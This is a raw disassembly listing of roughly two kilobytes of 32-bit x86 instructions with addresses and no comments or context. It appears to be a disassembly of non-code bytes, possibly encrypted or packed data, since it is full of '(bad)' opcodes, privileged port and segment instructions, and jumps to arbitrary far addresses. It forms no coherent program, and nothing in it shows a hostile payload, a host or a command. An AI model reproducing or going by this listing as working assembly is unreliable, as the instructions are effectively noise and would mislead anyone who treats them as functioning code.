  425ded:	popf   
  425dee:	xor    eax,0xda3653c5
  425df3:	rcr    BYTE PTR [ebx-0x506fb7a5],cl
  425df9:	mov    dh,0xb7
  425dfb:	sub    al,BYTE PTR [edx]
  425dfd:	mov    BYTE PTR [edx+eax*8+0x75],0xdb
  425e02:	and    al,0xe1
  425e04:	adc    ah,BYTE PTR [esi+0x688fd872]
  425e0a:	mov    BYTE PTR [edi-0x5ff6193c],ch
  425e10:	neg    ch
  425e12:	and    al,0x97
  425e14:	repnz lods eax,DWORD PTR ds:[esi]
  425e16:	imul   esp,ecx,0xffffffee
  425e19:	mov    al,ds:0x5c5ab079
  425e1e:	sbb    eax,0xbb564d4f
  425e23:	push   edx
  425e24:	xchg   ebp,eax
  425e25:	fmul   st,st(6)
  425e27:	cld    
  425e28:	mov    esi,0x1bf91dd1
  425e2d:	sbb    eax,0xf2bb00d1
  425e32:	fnstenv [ebx+ebp*1-0x35]
  425e36:	push   edi
  425e37:	pop    ecx
  425e38:	push   cs
  425e39:	hlt    
  425e3a:	adc    al,0x72
  425e3c:	cmp    BYTE PTR [eax-0x25acfa2],ch
  425e42:	mov    ah,al
  425e44:	and    BYTE PTR [eax+0x43],ch
  425e47:	aas    
  425e48:	sub    eax,0x4e6a76a0
  425e4d:	dec    ecx
  425e4e:	push   eax
  425e4f:	dec    esi
  425e50:	dec    ecx
  425e51:	mov    fs,WORD PTR [eax-0x3b61c3b6]
  425e57:	ja     0x425e3b
  425e59:	xor    BYTE PTR [ecx+0x1b578525],dh
  425e5f:	mov    edx,0x26918a9a
  425e64:	pop    eax
  425e65:	dec    esp
  425e66:	pop    ecx
  425e67:	dec    ebx
  425e68:	cmc    
  425e69:	outs   dx,DWORD PTR ds:[esi]
  425e6a:	mov    ch,0x63
  425e6c:	pop    ebp
  425e6d:	out    dx,eax
  425e6e:	mov    eax,0x8c57a7c
  425e73:	xchg   edx,eax
  425e74:	inc    esp
  425e75:	paddw  mm4,QWORD PTR [eax+0x232bdcb3]
  425e7c:	add    eax,0xbcbf0872
  425e81:	inc    ebp
  425e82:	jmp    0x24bf:0x5121a698
  425e89:	popa   
  425e8a:	inc    esp
  425e8b:	es cmp eax,0x9de84cd8
  425e91:	and    al,0xd8
  425e93:	test   BYTE PTR [edx-0x1a7bbe26],dl
  425e99:	stos   DWORD PTR es:[edi],eax
  425e9a:	into   
  425e9b:	add    BYTE PTR [ebx],0xab
  425e9e:	adc    DWORD PTR [ecx],0xcb349202
  425ea4:	pop    ds
  425ea5:	lods   al,BYTE PTR ds:[esi]
  425ea6:	in     eax,0xcd
  425ea8:	mov    cl,0xd7
  425eaa:	neg    BYTE PTR [edx+0x37519361]
  425eb0:	loope  0x425e54
  425eb2:	clc    
  425eb3:	sub    al,BYTE PTR [edx+0x5f]
  425eb6:	fs (bad) 
  425eb8:	ins    DWORD PTR es:[edi],dx
  425eb9:	sub    al,0x27
  425ebb:	lea    ebx,[esi]
  425ebd:	mov    ebp,0x8779feff
  425ec2:	jo     0x425f11
  425ec4:	jns    0x425e98
  425ec6:	(bad)  
  425ec7:	ins    DWORD PTR es:[edi],dx
  425ec8:	dec    edx
  425ec9:	xchg   ecx,eax
  425eca:	push   ds
  425ecb:	push   edx
  425ecc:	mov    edx,DWORD PTR [edx+0x4d]
  425ecf:	fistp  QWORD PTR [esi]
  425ed1:	inc    eax
  425ed2:	cmp    esp,DWORD PTR ds:0x710316bd
  425ed8:	dec    esp
  425ed9:	adc    BYTE PTR [eax+0xe],bl
  425edc:	mov    al,BYTE PTR [eax-0x1a]
  425edf:	pop    ss
  425ee0:	aad    0xc9
  425ee2:	or     BYTE PTR [eax+eiz*1-0x5524ac68],ah
  425ee9:	retf   
  425eea:	ja     0x425e6d
  425eec:	adc    al,0x23
  425eee:	or     BYTE PTR [edi-0x2072294e],dl
  425ef4:	dec    edx
  425ef5:	xchg   DWORD PTR [eax-0x1e],ecx
  425ef8:	mov    ds:0xdfd4d626,al
  425efd:	dec    esp
  425efe:	jmp    0x425ec7
  425f00:	test   BYTE PTR [ecx+0x2e5c3857],ch
  425f06:	mov    edx,0x89f4e4ce
  425f0b:	pop    esi
  425f0c:	aaa    
  425f0d:	mov    esi,0x16a92c9d
  425f12:	mov    ds:0x967bc01b,eax
  425f17:	in     eax,dx
  425f18:	lea    edi,[edx-0x66]
  425f1b:	ja     0x425eca
  425f1d:	les    edi,FWORD PTR gs:0xcff5d11
  425f24:	add    bh,BYTE PTR [esp+edx*1-0x46c327f8]
  425f2b:	outs   dx,BYTE PTR ds:[esi]
  425f2c:	stc    
  425f2d:	lahf   
  425f2e:	rcl    BYTE PTR [ebx-0x774fc826],cl
  425f34:	dec    DWORD PTR [ebx-0x5fc743b2]
  425f3a:	ins    BYTE PTR es:[edi],dx
  425f3b:	or     BYTE PTR [ebp+0x63],0x5f
  425f3f:	daa    
  425f40:	cmp    ah,0xea
  425f43:	fwait
  425f44:	(bad)  
  425f45:	pop    es
  425f46:	jae    0x425ece
  425f48:	sbb    bh,BYTE PTR [esi+0x15]
  425f4b:	sahf   
  425f4c:	inc    edx
  425f4d:	and    BYTE PTR ds:0xa0a9bcd4,bl
  425f53:	pop    edi
  425f54:	xor    bh,BYTE PTR [ebp-0xc7ec7b5]
  425f5a:	je     0x425f1c
  425f5c:	inc    esi
  425f5d:	lea    ebp,[eax]
  425f5f:	jne    0x425f7a
  425f61:	xor    cl,ch
  425f63:	adc    dl,BYTE PTR [ecx-0x51845cd3]
  425f69:	pushf  
  425f6a:	xchg   edx,eax
  425f6b:	mov    edx,0x17f48581
  425f70:	fnstcw WORD PTR [ebp+0x3f]
  425f73:	mov    eax,0xb3082c8a
  425f78:	pop    eax
  425f79:	add    eax,0xbe24b4b6
  425f7e:	dec    ecx
  425f7f:	fimul  WORD PTR ds:0x983af8be
  425f85:	push   ss
  425f86:	jge    0x425ff9
  425f88:	xchg   ebx,eax
  425f89:	dec    esp
  425f8a:	xor    BYTE PTR [ebx-0x9],ah
  425f8d:	fisttp WORD PTR [ebx+0xb33662b]
  425f93:	cmp    BYTE PTR [ecx-0x305a8ed5],al
  425f99:	lds    ecx,FWORD PTR [ebx-0x32]
  425f9c:	and    WORD PTR [edx+0x30dc213],ax
  425fa3:	pop    esi
  425fa4:	hlt    
  425fa5:	and    DWORD PTR [edi-0x59],0x4fc40ee2
  425fac:	aas    
  425fad:	je     0x425ff5
  425faf:	add    ch,al
  425fb1:	addr16 pop ds
  425fb3:	xchg   edi,eax
  425fb4:	dec    esp
  425fb5:	and    BYTE PTR [ecx-0x56816c42],ah
  425fbb:	sbb    BYTE PTR [ecx+0x38fceab9],dl
  425fc1:	cli    
  425fc2:	and    al,BYTE PTR [edx-0xd5576fa]
  425fc8:	sbb    BYTE PTR [edx],al
  425fca:	jg     0x426015
  425fcc:	xlat   BYTE PTR ds:[ebx]
  425fcd:	fwait
  425fce:	push   0x62b0f800
  425fd3:	mov    cl,0x85
  425fd5:	cmc    
  425fd6:	xor    edi,edx
  425fd8:	jge    0x426030
  425fda:	sbb    cl,BYTE PTR [ecx-0x22385041]
  425fe0:	fcom   QWORD PTR [edx+0x5635e46e]
  425fe6:	push   ebx
  425fe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fe8:	retf   
  425fe9:	sub    dh,BYTE PTR [edi-0x18]
  425fec:	jp     0x42603b
  425fee:	pop    ebx
  425fef:	fisttp WORD PTR [ecx-0x58cf948c]
  425ff5:	mov    WORD PTR [edx+0x173e3ac],cs
  425ffb:	rcl    ebp,cl
  425ffd:	inc    ecx
  425ffe:	sub    edx,DWORD PTR [ebx+0x58f4ee6c]
  426004:	lahf   
  426005:	bound  esi,QWORD PTR [ebx]
  426007:	cmp    BYTE PTR [ebp-0x2b91731d],al
  42600d:	sub    al,0x1d
  42600f:	inc    edx
  426010:	push   ebx
  426011:	(bad)  
  426012:	stos   BYTE PTR es:[edi],al
  426013:	mov    dh,BYTE PTR [edi-0x40ee9b9a]
  426019:	fldcw  WORD PTR [ecx]
  42601b:	enter  0x22ac,0x8e
  42601f:	arpl   bp,bx
  426021:	(bad)  
  426022:	into   
  426023:	imul   ebp,DWORD PTR ds:0x12977568,0xe20635fd
  42602d:	cmp    al,0x4a
  42602f:	(bad)  [eax]
  426031:	js     0x426038
  426033:	cmp    esi,0x619cd376
  426039:	mov    eax,ds:0xcf76bb9f
  42603e:	(bad)  
  42603f:	fisubr WORD PTR [edx]
  426041:	inc    ebx
  426042:	(bad)  
  426043:	jbe    0x426096
  426045:	push   eax
  426046:	and    DWORD PTR [edx+0x7c8be5b5],0xdff00680
  426050:	je     0x425fe5
  426052:	push   ds
  426053:	aas    
  426054:	sahf   
  426055:	out    dx,eax
  426056:	jecxz  0x42608a
  426058:	sahf   
  426059:	push   cs
  42605a:	stos   BYTE PTR es:[edi],al
  42605b:	ss sbb al,0x66
  42605e:	fisttp DWORD PTR [ebx-0x11]
  426061:	test   DWORD PTR [edx],ebx
  426063:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426064:	xchg   ebp,eax
  426065:	and    eax,0xbecd31ae
  42606a:	lods   al,BYTE PTR ds:[esi]
  42606b:	pop    esp
  42606c:	cdq    
  42606d:	push   edx
  42606e:	and    DWORD PTR [esi-0x3f409e7a],ecx
  426074:	inc    ebp
  426075:	xchg   ebx,eax
  426076:	jnp    0x42602a
  426078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426079:	enter  0x5d52,0x38
  42607d:	adc    dh,BYTE PTR [edi-0x7d1bfeac]
  426083:	sbb    eax,DWORD PTR [edx+edx*4+0x1b5985e3]
  42608a:	in     al,dx
  42608b:	xchg   esp,eax
  42608c:	xor    ah,bl
  42608e:	sub    al,ah
  426090:	retf   
  426091:	cmp    ebp,edx
  426093:	test   DWORD PTR [ecx+0x1f7f5da],ebp
  426099:	mov    edi,0xbbd3eb30
  42609e:	push   ebx
  42609f:	(bad)  
  4260a0:	jmp    0xfa128284
  4260a5:	fisub  WORD PTR [edi]
  4260a7:	and    DWORD PTR [edx+esi*4-0x3fde258],ebx
  4260ae:	sti    
  4260af:	jmp    0x42608f
  4260b1:	nop
  4260b2:	aad    0x26
  4260b4:	dec    edx
  4260b5:	ss jae 0x42607f
  4260b8:	pop    ebp
  4260b9:	lods   al,BYTE PTR ds:[esi]
  4260ba:	xor    edi,DWORD PTR [esi-0x57]
  4260bd:	jae    0x426056
  4260bf:	out    dx,al
  4260c0:	dec    edx
  4260c1:	in     al,dx
  4260c2:	and    BYTE PTR [ebx+esi*8+0x172ddeff],0xb6
  4260ca:	in     al,dx
  4260cb:	push   ss
  4260cc:	pushf  
  4260cd:	pop    ss
  4260ce:	sbb    edx,esp
  4260d0:	imul   esp,DWORD PTR [edx+eiz*8],0x2f
  4260d4:	fistp  WORD PTR [ebx]
  4260d6:	mov    WORD PTR [esi-0x75c18f65],?
  4260dc:	xor    edi,DWORD PTR [eax+0x61ca3913]
  4260e2:	gs das 
  4260e4:	ja     0x426153
  4260e6:	xchg   edx,eax
  4260e7:	sti    
  4260e8:	mov    esi,0xa36ab20b
  4260ed:	push   cs
  4260ee:	movq   mm2,mm0
  4260f1:	out    dx,eax
  4260f2:	inc    edx
  4260f3:	jl     0x426088
  4260f5:	cmp    DWORD PTR [edx+0x24cd1d56],edi
  4260fb:	xlat   BYTE PTR ds:[ebx]
  4260fc:	imul   ecx,esi,0x57d956dc
  426102:	into   
  426103:	ret    
  426104:	loopne 0x4260b8
  426106:	sub    eax,0xe7c0e7e0
  42610b:	adc    ch,BYTE PTR [eax+0x724df450]
  426111:	add    ebx,edx
  426113:	div    DWORD PTR [ebx]
  426115:	xchg   ebp,eax
  426116:	push   esp
  426117:	push   edx
  426118:	cli    
  426119:	fdivr  QWORD PTR [ebx-0x5024ff82]
  42611f:	xor    al,al
  426121:	int    0xbc
  426123:	dec    ebx
  426124:	push   ebp
  426125:	mov    edx,0xd806f6e5
  42612a:	jle    0x426159
  42612c:	and    ecx,ebp
  42612e:	icebp  
  42612f:	ins    DWORD PTR es:[edi],dx
  426130:	mov    edx,ebp
  426132:	jmp    DWORD PTR [ecx-0x2997dd97]
  426138:	mov    ebx,0xbbf84848
  42613d:	lahf   
  42613e:	and    eax,0xb0a42f1
  426143:	jp     0x426114
  426145:	xchg   cl,dl
  426147:	push   ebx
  426148:	cdq    
  426149:	and    DWORD PTR [esi-0x4a],ecx
  42614c:	(bad)  
  42614d:	mov    ebp,DWORD PTR [ebp-0x6d]
  426150:	inc    eax
  426151:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426152:	cdq    
  426153:	xor    edx,ecx
  426155:	out    dx,al
  426156:	scas   eax,DWORD PTR es:[edi]
  426157:	jno    0x426141
  426159:	jp     0x426175
  42615b:	das    
  42615c:	shl    dh,1
  42615e:	dec    esi
  42615f:	jnp    0x426100
  426161:	fmul   DWORD PTR [esi+0x7a]
  426164:	xor    bl,BYTE PTR [ebp-0x670aa6cd]
  42616a:	jbe    0x4260f7
  42616c:	out    dx,al
  42616d:	pop    ss
  42616e:	sti    
  42616f:	mov    BYTE PTR [ebp-0x7b625d42],ch
  426175:	sbb    DWORD PTR [ebx-0x30935a13],ebx
  42617b:	mov    bh,0xaa
  42617d:	xor    edx,esi
  42617f:	mov    edx,0xfde35e5d
  426184:	push   cs
  426185:	add    al,0xf2
  426187:	sbb    eax,0x5f82b411
  42618c:	cdq    
  42618d:	xchg   ebx,eax
  42618e:	addr16 (bad) 
  426190:	fcom   QWORD PTR [ecx]
  426192:	mov    DWORD PTR ds:0x41d7c3cd,esi
  426198:	and    BYTE PTR [ecx],dh
  42619a:	mov    DWORD PTR [edx+0x20ceda01],esp
  4261a0:	add    al,0xb1
  4261a2:	lahf   
  4261a3:	jno    0x42621d
  4261a5:	mov    bl,0xa2
  4261a7:	push   esp
  4261a8:	or     bl,BYTE PTR [ecx]
  4261aa:	sti    
  4261ab:	js     0x4261b4
  4261ad:	(bad)  
  4261ae:	mov    ss,WORD PTR [ebx]
  4261b0:	clc    
  4261b1:	addr16 inc edi
  4261b3:	cli    
  4261b4:	dec    esp
  4261b5:	enter  0x28d8,0x32
  4261b9:	ret    
  4261ba:	xchg   edx,eax
  4261bb:	sti    
  4261bc:	scas   al,BYTE PTR es:[edi]
  4261bd:	push   ebx
  4261be:	adc    al,0x9
  4261c0:	xchg   edi,eax
  4261c1:	enter  0xf57c,0xf5
  4261c5:	fsin   
  4261c7:	mov    al,0x3f
  4261c9:	ss push ebx
  4261cb:	adc    eax,0xf4d29a0a
  4261d0:	mov    al,BYTE PTR [eax]
  4261d2:	mov    fs,ebx
  4261d4:	xchg   edx,eax
  4261d5:	xchg   edi,eax
  4261d6:	cmp    eax,0x58eae4e7
  4261db:	outs   dx,DWORD PTR ds:[esi]
  4261dc:	aaa    
  4261dd:	xor    DWORD PTR [esi+ecx*1+0x2d0fcae],ebp
  4261e4:	jns    0x4261de
  4261e6:	and    esi,DWORD PTR [eax]
  4261e8:	in     al,dx
  4261e9:	sbb    al,0x83
  4261eb:	xchg   esp,eax
  4261ec:	and    ch,BYTE PTR ds:0x1076c358
  4261f2:	loop   0x4261fb
  4261f4:	adc    BYTE PTR [edx+0x595560b1],al
  4261fa:	pop    edx
  4261fb:	imul   ecx,DWORD PTR [eax+0x7b],0x7b
  4261ff:	or     edi,0x1b6108e5
  426205:	mov    ebp,0xdc4fac9f
  42620a:	add    ebx,0xfc09beca
  426210:	xor    al,0xa8
  426212:	mov    eax,ds:0x17e6d1f1
  426217:	push   ecx
  426218:	mov    ch,0x14
  42621a:	sub    al,BYTE PTR [edi]
  42621c:	xor    bh,bh
  42621e:	fisttp WORD PTR [esi]
  426220:	sbb    esi,ebp
  426222:	cmp    BYTE PTR ds:[ecx+0x1c],ah
  426226:	inc    eax
  426227:	fsubp  st(1),st
  426229:	in     al,0xc5
  42622b:	and    bh,BYTE PTR [ebx]
  42622d:	xchg   esp,eax
  42622e:	stc    
  42622f:	vpunpckhwd ymm2,ymm2,ymm7
  426233:	push   esp
  426234:	inc    edi
  426235:	test   ecx,ebx
  426237:	cwde   
  426238:	xor    esi,esi
  42623a:	push   ecx
  42623b:	aaa    
  42623c:	ret    0xa0c1
  42623f:	ret    0xf608
  426242:	add    eax,ebp
  426244:	loopne 0x4262aa
  426246:	popa   
  426247:	dec    edx
  426248:	loopne 0x426209
  42624a:	push   es
  42624b:	mov    edx,0xa4ac240c
  426250:	shl    DWORD PTR [edi+0x357ebebc],1
  426256:	dec    ebp
  426257:	push   ecx
  426258:	push   ebp
  426259:	sbb    al,0xbf
  42625b:	mov    dh,0xe1
  42625d:	pop    ss
  42625e:	push   eax
  42625f:	out    0xde,al
  426261:	inc    esi
  426262:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426263:	xchg   edx,eax
  426264:	sub    al,0xc5
  426266:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426267:	or     al,0x98
  426269:	jbe    0x4262ba
  42626b:	test   eax,0x7691a413
  426270:	popf   
  426271:	out    dx,eax
  426272:	pop    ds
  426273:	cwde   
  426274:	sahf   
  426275:	sbb    al,0xc7
  426277:	lea    edi,[edx+0x22]
  42627a:	test   eax,0x4a0e
  42627f:	add    BYTE PTR [eax],al
  426281:	add    BYTE PTR [ecx-0x3d],dh
  426284:	loop   0x426271
  426286:	bnd jmp 0x426302
  426289:	fcomi  st,st(7)
  42628b:	mov    edi,db7
  42628e:	add    eax,0xc8279ac2
  426293:	fiadd  DWORD PTR [ecx]
  426295:	add    bl,dh
  426297:	add    al,0x0
  426299:	add    ah,bh
  42629b:	imul   eax,DWORD PTR [edx+0x194fe1a8],0x4eb46f34
  4262a5:	cmp    eax,0x47c5997
  4262aa:	inc    DWORD PTR [eax+0x383a9f26]
  4262b0:	aas    
  4262b1:	xchg   BYTE PTR [edx+0x3a5c79b0],dl
  4262b7:	aad    0x4e
  4262b9:	imul   ecx,DWORD PTR [eax+0x56752ff8],0xfa76334b
  4262c3:	rcr    DWORD PTR [ebx-0x4b9c3cad],0xfc
  4262ca:	mov    dl,0x83
  4262cc:	mov    edx,0xd7e3d007
  4262d1:	ret    
  4262d2:	outs   dx,BYTE PTR ds:[esi]
  4262d3:	push   ebp
  4262d4:	sbb    BYTE PTR [esi+0x79],cl
  4262d7:	cmovl  esp,DWORD PTR [esp+esi*1]
  4262db:	adc    eax,ecx
  4262dd:	test   DWORD PTR [edi-0x18817d28],eax
  4262e3:	call   DWORD PTR [eax-0x52c5747c]
  4262e9:	fistp  QWORD PTR [eax-0x28]
  4262ec:	dec    esi
  4262ed:	lods   eax,DWORD PTR ds:[esi]
  4262ee:	sub    al,0xcd
  4262f0:	xor    al,0xbb
  4262f2:	mov    ecx,0x3b0bae88
  4262f7:	into   
  4262f8:	push   ds
  4262f9:	push   esi
  4262fa:	int    0xf9
  4262fc:	jo     0x426290
  4262fe:	mov    ds,WORD PTR [ecx]
  426300:	mov    edx,DWORD PTR [eax+0x3c]
  426303:	dec    edx
  426304:	mov    bh,0x5
  426306:	jp     0x42637b
  426308:	jge    0x426386
  42630a:	(bad)  
  42630b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42630c:	stc    
  42630d:	sti    
  42630e:	jge    0x4262a8
  426310:	lods   eax,DWORD PTR ds:[esi]
  426311:	int3   
  426312:	fs mov ecx,0xc6879248
  426318:	jg     0x426315
  42631a:	cmc    
  42631b:	ja     0x426344
  42631d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42631e:	scas   eax,DWORD PTR es:[edi]
  42631f:	inc    ebx
  426320:	rol    DWORD PTR [edx],cl
  426322:	mov    ds,WORD PTR [ebx-0x61]
  426325:	jge    0x4262cb
  426327:	(bad)  [esi+0x66a76be6]
  42632d:	push   ss
  42632e:	inc    ebx
  42632f:	cli    
  426330:	push   ebp
  426331:	mov    esp,0x9e2471ba
  426336:	pusha  
  426337:	xchg   ecx,eax
  426338:	(bad)  
  426339:	fcom   DWORD PTR [edi+0xa]
  42633c:	mov    dh,bl
  42633e:	xor    BYTE PTR [edi-0x7e4cacb4],ah
  426344:	pop    ecx
  426345:	mov    ah,0x9c
  426347:	(bad)  
  426348:	mov    edi,0xde001005
  42634d:	mov    BYTE PTR [eax+0x647780f3],bh
  426353:	dec    edi
  426354:	imul   eax,DWORD PTR [eax-0x14],0x807c74ff
  42635b:	scas   eax,DWORD PTR es:[edi]
  42635c:	pusha  
  42635d:	ror    esp,1
  42635f:	dec    DWORD PTR [ebx]
  426361:	dec    eax
  426362:	pushf  
  426363:	popf   
  426364:	jmp    0x4262ea
  426366:	xor    al,0x4e
  426368:	mov    ch,0x7e
  42636a:	cmp    al,0x9d
  42636c:	cmp    DWORD PTR [edi+0x2d],0x3d1e32c3
  426373:	pop    ebp
  426374:	inc    edx
  426375:	jno    0x4263ce
  426377:	jmp    0xf6f47929
  42637c:	icebp  
  42637d:	pusha  
  42637e:	rcl    BYTE PTR [edx],0x49
  426381:	and    ecx,0xffffffe5
  426384:	mov    ebx,0x4a81015d
  426389:	std    
  42638a:	out    dx,al
  42638b:	xor    al,0x98
  42638d:	dec    eax
  42638e:	pop    eax
  42638f:	mov    bh,0xc4
  426391:	fidivr DWORD PTR [esi+0x2e]
  426394:	ins    DWORD PTR es:[edi],dx
  426395:	mov    ch,BYTE PTR [ecx-0x6b]
  426398:	adc    ch,BYTE PTR [eax]
  42639a:	int    0x2c
  42639c:	or     BYTE PTR [ecx+0x75],dl
  42639f:	adc    al,0x50
  4263a1:	sub    eax,0x61be7574
  4263a6:	ror    BYTE PTR [ecx-0x76],0xad
  4263aa:	(bad)  
  4263ab:	xchg   edi,eax
  4263ac:	shl    DWORD PTR [esp+ebx*8],1
  4263af:	inc    edi
  4263b0:	not    ebp
  4263b2:	pop    ebp
  4263b3:	pop    es
  4263b4:	iret   
  4263b5:	call   0x9633:0x35a076cb
  4263bc:	imul   ebp,DWORD PTR [eax],0x2
  4263bf:	add    edi,esi
  4263c1:	in     al,0x83
  4263c3:	jecxz  0x426434
  4263c5:	jo     0x42643e
  4263c7:	xchg   ebp,eax
  4263c8:	cmp    DWORD PTR [edi],0x967332
  4263ce:	pop    ebx
  4263cf:	(bad)  
  4263d0:	cli    
  4263d1:	inc    ecx
  4263d2:	dec    ebx
  4263d3:	add    eax,0x1a6be245
  4263d8:	push   esp
  4263d9:	sub    BYTE PTR [edx+0x22],cl
  4263dc:	out    0xb1,al
  4263de:	iret   
  4263df:	ss jp  0x4263ed
  4263e2:	push   ebp
  4263e3:	fwait
  4263e4:	out    dx,eax
  4263e5:	xchg   esp,eax
  4263e6:	xor    eax,0xb00b3f0c
  4263eb:	scas   eax,DWORD PTR es:[edi]
  4263ec:	sahf   
  4263ed:	cld    
  4263ee:	in     eax,dx
  4263ef:	or     eax,0x42545709
  4263f4:	loope  0x4263c8
  4263f6:	or     ecx,edi
  4263f8:	pop    esp
  4263f9:	mov    ah,0x7
  4263fb:	xchg   ebp,eax
  4263fc:	imul   ebx,eax,0x24
  4263ff:	jge    0x42646c
  426401:	adc    BYTE PTR [ebp+0x6a],bl
  426404:	jge    0x42643f
  426406:	or     eax,0x160139ae
  42640b:	pop    ds
  42640c:	(bad)  
  42640d:	ror    eax,1
  42640f:	shl    BYTE PTR [ecx-0x10],1
  426412:	stc    
  426413:	mov    ds:0x9f5dd7b0,al
  426418:	push   edi
  426419:	cmp    al,0x1a
  42641b:	xchg   edi,eax
  42641c:	mov    ebp,0x9b9c30dd
  426421:	sub    eax,DWORD PTR [edi]
  426423:	cmp    eax,0xd1220706
  426428:	xchg   ecx,eax
  426429:	repz retf 0x3bfc
  42642d:	ss idiv esp
  426430:	jmp    0x2b87d02e
  426435:	jecxz  0x4263cf
  426437:	xor    al,0xb4
  426439:	inc    esi
  42643a:	fstp   DWORD PTR [edi-0x32]
  42643d:	imul   DWORD PTR [ecx]
  42643f:	(bad)  
  426440:	sub    BYTE PTR [ebp+0x4f],bh
  426443:	push   edx
  426444:	loope  0x4263d0
  426446:	inc    edx
  426447:	adc    BYTE PTR [edi-0x79fa45da],al
  42644d:	mov    dl,0x3d
  42644f:	imul   edi,DWORD PTR [edx+0x35],0x1b
  426453:	scas   eax,DWORD PTR es:[edi]
  426454:	fldcw  WORD PTR [ebx-0x25]
  426457:	sub    eax,0x6765bd03
  42645c:	je     0x4263f8
  42645e:	or     eax,0x2af1edd8
  426463:	dec    edi
  426464:	fld    st(0)
  426466:	scas   eax,DWORD PTR es:[edi]
  426467:	push   edx
  426468:	push   eax
  426469:	stos   DWORD PTR es:[edi],eax
  42646a:	jo     0x4263fb
  42646c:	cs xchg ebp,eax
  42646e:	and    eax,0x6b7c1aff
  426473:	xor    dl,BYTE PTR [esi+esi*2+0x40efb9eb]
  42647a:	push   eax
  42647b:	push   ds
  42647c:	stc    
  42647d:	outs   dx,DWORD PTR ds:[esi]
  42647e:	hlt    
  42647f:	or     DWORD PTR [eax-0x3e],edi
  426482:	sub    al,0x9f
  426484:	ret    
  426485:	je     0x4264b4
  426487:	enter  0x6c57,0xb7
  42648b:	scas   al,BYTE PTR es:[edi]
  42648c:	mov    esi,0x143ea771
  426491:	shr    bh,1
  426493:	adc    eax,0x44b68ea4
  426498:	sub    bh,bl
  42649a:	lahf   
  42649b:	out    dx,eax
  42649c:	das    
  42649d:	leave  
  42649e:	sub    BYTE PTR [ebx-0x18],al
  4264a1:	jmp    0xc5a82f91
  4264a6:	xor    BYTE PTR [ebp-0x69],dl
  4264a9:	push   cs
  4264aa:	or     dh,dh
  4264ac:	jb     0x4264be
  4264ae:	and    eax,0xc96f2599
  4264b3:	icebp  
  4264b4:	icebp  
  4264b5:	jmp    0x4264e5
  4264b7:	xchg   DWORD PTR [ebx+0x445087c2],edx
  4264bd:	and    al,0xd2
  4264bf:	cwde   
  4264c0:	pop    ds
  4264c1:	scas   al,BYTE PTR es:[edi]
  4264c2:	in     eax,0x5
  4264c4:	aas    
  4264c5:	push   ds
  4264c6:	fwait
  4264c7:	jns    0x42650d
  4264c9:	push   ebx
  4264ca:	outs   dx,DWORD PTR ds:[esi]
  4264cb:	shl    BYTE PTR [ecx],1
  4264cd:	sub    BYTE PTR [eax-0x3e938b29],cl
  4264d3:	cmp    DWORD PTR [ecx+0x4bbe3da7],edi
  4264d9:	xor    al,0x33
  4264db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264dc:	pop    edx
  4264dd:	(bad)  
  4264df:	cmp    BYTE PTR [ebx],0x88
  4264e2:	lahf   
  4264e3:	xchg   esp,eax
  4264e4:	jp     0x426559
  4264e6:	lahf   
  4264e7:	push   es
  4264e8:	mov    DWORD PTR [esi-0x1b4ae73b],edi
  4264ee:	test   cl,bl
  4264f0:	jle    0x426478
  4264f2:	outs   dx,BYTE PTR ds:[esi]
  4264f3:	jno    0x426568
  4264f5:	ins    BYTE PTR es:[edi],dx
  4264f6:	jns    0x42647b
  4264f8:	ins    DWORD PTR es:[edi],dx
  4264f9:	mov    bl,0x91
  4264fb:	scas   eax,DWORD PTR es:[edi]
  4264fc:	jo     0x4264b8
  4264fe:	xchg   esi,eax
  4264ff:	cmp    DWORD PTR [esi-0x63e1049f],ebx
  426505:	push   ebp
  426506:	xchg   ecx,eax
  426507:	in     eax,dx
  426508:	push   esp
  426509:	sti    
  42650a:	dec    ecx
  42650b:	push   0x73
  42650d:	cmp    DWORD PTR [esi-0xa71406c],ecx
  426513:	mov    eax,0x727e0076
  426518:	mov    edx,0x1272e590
  42651d:	out    dx,eax
  42651e:	sbb    DWORD PTR [ebp+0x7af7a47d],0xeaebc2bc
  426528:	pop    eax
  426529:	js     0x42651f
  42652b:	outs   dx,DWORD PTR ds:[esi]
  42652c:	add    ah,BYTE PTR [edi+0x73]
  42652f:	outs   dx,DWORD PTR ds:[esi]
  426530:	push   ss
  426531:	mov    dh,0xcd
  426533:	jb     0x426544
  426535:	mov    dl,0x8c
  426537:	dec    esi
  426538:	fst    st(2)
  42653a:	in     al,0xa1
  42653c:	pop    eax
  42653d:	shl    DWORD PTR [esi+ecx*2],0xcd
  426541:	gs cli 
  426543:	int3   
  426544:	jecxz  0x4265b5
  426546:	jp     0x426589
  426548:	inc    ecx
  426549:	in     eax,0xf2
  42654b:	lea    ecx,[ebp+0x5]
  42654e:	xlat   BYTE PTR ds:[ebx]
  42654f:	pop    ebx
  426550:	popf   
  426551:	ret    
  426552:	pop    esi
  426553:	push   edi
  426554:	(bad)  
  426555:	mov    gs,WORD PTR [eax]
  426557:	ret    0x9076
  42655a:	and    eax,DWORD PTR [esi+0x30]
  42655d:	aaa    
  42655e:	mov    bl,ah
  426560:	shr    BYTE PTR [esi],1
  426562:	loopne 0x4265c2
  426564:	add    al,0xe2
  426566:	out    dx,eax
  426567:	aad    0x97
  426569:	aad    0xd6
  42656b:	cmp    ecx,edx
  42656d:	lods   al,BYTE PTR ds:[esi]
  42656e:	push   edx
  42656f:	in     al,dx
  426570:	pushf  
  426571:	xchg   ebp,eax
  426572:	adc    BYTE PTR [ecx+eiz*1+0x5ad56288],0xe9
  42657a:	mov    esi,0xbf2c35f8
  42657f:	jg     0x42658d
  426581:	dec    eax
  426582:	mov    WORD PTR [edi],es
  426584:	retf   
  426585:	xchg   edx,eax
  426586:	pop    ebp
  426587:	(bad)  
  426588:	mov    ah,0xa
  42658a:	add    BYTE PTR [ebx],0x8
  42658d:	jmp    eax
  42658f:	cmp    al,0xd2
  426591:	pop    esi
  426592:	or     al,0x4a
  426594:	shl    esi,cl
  426596:	in     eax,dx
  426597:	xor    eax,0xa47effa0
  42659c:	mov    ds:0xb54d2965,eax
  4265a1:	stos   DWORD PTR es:[edi],eax
